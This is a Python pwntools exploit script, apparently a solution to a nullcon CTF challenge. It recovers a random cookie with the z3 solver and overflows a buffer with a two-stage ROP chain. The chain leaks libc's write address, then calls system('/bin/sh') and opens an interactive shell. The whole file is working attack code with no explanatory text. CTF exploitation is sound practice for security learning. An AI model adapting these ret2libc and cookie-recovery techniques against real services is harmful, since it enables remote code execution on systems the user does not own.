from pwn import *
from z3 import *
from sys import exit

context.arch='amd64'

value = BitVec('value', 64)

main_addr = 0x0000000000400822
start_addr = 0x00000000004006e0

elf = ELF('main')

if args.REMOTE:
    p = remote('pwn3.ctf.nullcon.net', 1234)
    libc = ELF('libc.so.6')
else:
    p = process(elf.path)

    """
    gdb.attach(p, '''
        break * 0x4009ed
        continue
        ''')
    """

    libc = elf.libc

s = Solver()

next_value = value ^ 25214903917

val_list = []

for i in range(10):
    next_value = 25214903917 * next_value + 11
    val_list.append((next_value >> 16) & 0xffffffff)

p.recvuntil(b'sssh')

for i in range(0, 10, 2):
    s.add(int(p.recvline().strip()) == val_list[i])

for i in range(1, 10, 2):
    s.add(int(p.recvline().strip()) == val_list[i])

s.add(ULT(value, 0x100000000))

if s.check() == unsat:
    exit(0)

m = s.model()
cookie = int('%r' % (m[value], ))

padding = b'A' * 0x14 + p64(cookie) + b'B' * 0x2c

# first execution

p.recvuntil(b'hello\n')

rop = ROP(elf.path)

rop.call(elf.plt.write, [constants.STDOUT_FILENO, elf.got.write, 0x8])
rop.raw(start_addr)

payload = padding + rop.chain()

p.send(payload)

write_addr = u64(p.recv(8))
libc.address = write_addr - libc.symbols.write

log.success('write @ 0x%x' % (write_addr, ))
log.info('libc @ 0x%x' % (libc.address, ))

# second execution

p.recvuntil(b'hello\n')

rop = ROP(elf.path)

rop.call(libc.symbols.system, [libc.search(b'/bin/sh\x00').__next__(), 0x0, 0x0])

payload = padding + rop.chain()

p.send(payload)

p.interactive()
